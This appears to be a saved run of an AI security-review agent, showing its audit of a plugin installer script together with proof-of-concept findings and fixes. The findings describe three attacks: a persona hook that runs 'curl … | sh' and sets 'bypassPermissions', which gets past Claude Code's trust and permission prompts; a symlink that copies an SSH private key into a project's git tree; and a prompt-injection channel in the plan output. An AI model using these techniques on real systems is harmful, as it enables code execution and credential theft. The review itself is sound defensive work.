# Run free-2: the 1,007-word free-collection agent (VoltAgent)

One of 18 runs behind Fig. 2 on truecast.dev. Captured 2026-10-16 with Claude Code 2.1.301 and `claude-opus-5-5`, run as `claude -p "$PROMPT" --agent security-engineer`. Whole session: $0.88, 2.9 min. Below the line is the agent's final message, unedited. Method and scoring: [README](README.md).

---

**Verdict: yes, a user can get owned.** I found two real holes, both proven by running the script in a throwaway home directory. Both depend on what a persona in the marketplace copy contains, not on the user's input. The personas shipped in this repo today are clean (no extra frontmatter keys, no symlinks), so this is a supply-chain risk, not an active compromise. The design says that scenario must be safe: `installer.md` G0 says the clone is "trusted for prose… not for structure," and `SECURITY.md` promises symlink escapes are rejected.

The path, name and version handling, by contrast, is careful and held up under testing.

## Critical

**1. A persona can run shell commands on the user's machine, and the approval screen doesn't show it.**
- **Cause:** `render_body` copies the clone's `subagent.md` byte-for-byte into `~/.claude/agents/<name>.md`. Nothing checks its frontmatter.
- **Why it matters:** Claude Code's docs say that "for security reasons" it ignores `hooks`, `mcpServers` and `permissionMode` in agents that come from a plugin. The same docs say agents in `~/.claude/agents/` keep those fields, and their hooks and MCP servers run without the folder-trust prompt. This installer moves persona content out of the restricted plugin location and into the unrestricted one.
- **Proof:** a `subagent.md` with `hooks: PreToolUse … command: "curl … | sh"` and an inline `mcpServers` entry was installed unchanged. The plan the user approves showed only `tools granted to @spoof: Read, Grep`. The hook runs in every project whenever the agent is used. `tools:` doesn't limit what a hook can do, and `permissionMode: bypassPermissions` also goes through.
- **Comparison:** the npm CLI lane is not affected. Its `composeAgentFile` (`src/materialize/index.ts`) builds the frontmatter from an allowlist: `name`, `description`, `model`, `tools`. The `hooks/` and `.mcp.json` check in `truecast publish` only looks at directories, not at frontmatter.
- **Who can do it:** anyone who controls the marketplace copy, such as a fork (the script expects forks; see the "source-mismatch" warning), a malicious persona pull request, or a compromised upstream.
- **Fix:** don't copy the frontmatter. Parse the template and re-emit only the four allowed keys, as the CLI does. At minimum, refuse (exit 7) any template whose frontmatter has a key outside `name|description|model|tools`.

**2. A symlinked template copies any file the user can read, such as an SSH key, into the project's git tree.**
- **Cause:** `scaffold_mandate` runs `cp "$CLONE_DIR/instance-template/mandate.md" …`, and `cp` follows symlinks.
- **Proof:** I made `mandate.md` a relative symlink pointing up to `~/.ssh/id_ed25519` (git stores symlinks fine). After `install evil --project --yes`, the key's contents were in `proj/.truecast/agents/evil/instance/mandate.md`. Git showed it as `?? …mandate.md` and it is **not** gitignored (only the agent file is), so the next `git add -A && git push` publishes the key. The plan only says "brief … (only if absent)."
- **Same root cause, lower impact:**
  - If `subagent.md` is a symlink, `cat` follows it into `~/.claude/agents/`.
  - `cp -R` of `core/` keeps symlinks, so a persona can plant `core/x -> ../../../../../.ssh` inside the folder the agent is told to read.
- **Fix:** before any read or copy, refuse symlinks in the clone persona tree: `[ -L ]` on `subagent.md`, `persona.toml`, `instance-template/mandate.md`, and `find "$CLONE_DIR" -type l` must return nothing. Optionally also gitignore `instance/` or warn about it.

## Medium

**3. The tool grant shown in the plan can be faked.**
- **Cause:** `body_tools` takes the first `tools:` line in lines 1–12, whether or not it is inside the frontmatter.
- **Proof:** a template with no `tools:` key (meaning every tool is allowed) and a body line `tools: Read` makes the plan say "tools granted: Read".
- **More gaps:** with duplicate keys the plan shows the first one, while a parser may use the last. A YAML list form shows as "unrestricted."
- **Fix:** read the field inside the `---` block only. This becomes moot if you adopt the fix for #1.

**4. Approval isn't tied to what gets installed.**
- **Cause:** the plan run and the `--yes` run each read the clone separately. Nothing checks that the version or content the user approved is what gets written.
- **Effect:** if the marketplace copy changes in between, the user installs something they never saw. Also, the only thing stopping `--yes` from being run early is the model following the slash-command text. The plan output includes the diff and file content, which are a prompt-injection channel aimed at that model.
- **Fix:** have the plan print a hash of the rendered body, and make `--yes` require `--expect=<hash>`.

## Low

5. **Script lookup** (all four commands):
   - They hard-code `~/.claude/plugins/marketplaces/truecast/...`, so they run whatever marketplace happens to be named `truecast`. The script's only check is `grep '"name": "truecast"'`.
   - The fallback runs `/bin/truecast-plugin.sh` when `CLAUDE_PLUGIN_ROOT` is empty.
   - Even when that variable is set, the fallback can't work: `CLONE=../..` from the plugin cache has no `marketplace.json`.
   - Fix: prefer `CLAUDE_PLUGIN_ROOT` and fail closed if it's empty.
6. **`--project <path>` is never validated in the command files.** Step 0 only validates the name, but the model still writes the path into a Bash command line. Also, `PROJECT_ROOT` doesn't get the `check_home` control-character check, so a newline in the path can fake a `TRUECAST_RESULT` line.
7. **`clone_origin` only removes credentials of the `user:pass@` form.** Tokens in a query string (`?token=`) still end up in `meta.json` and the plan.

## What held up

These all looked solid in review and testing:
- Name and semver validation happen before either value touches a path.
- `safe_write` and `safe_rm` check every path component for symlinks, not just the last one.
- Repo-side symlinks are refused on `--project` (`.claude`, `.gitignore`, `.truecast`).
- `remove` runs the same containment check before deleting.
- Writes are atomic (temp file plus rename).
- Locking matches the CLI's.
- `patsub_replacement` is handled.
- The command files' rule to "never paste `$ARGUMENTS`" is right for the name.

**Priority:** fix #1 and #2 before the next release (an allowlist for frontmatter, refusing symlinks in the clone), then #3 and #4. I've removed the throwaway PoC directory.
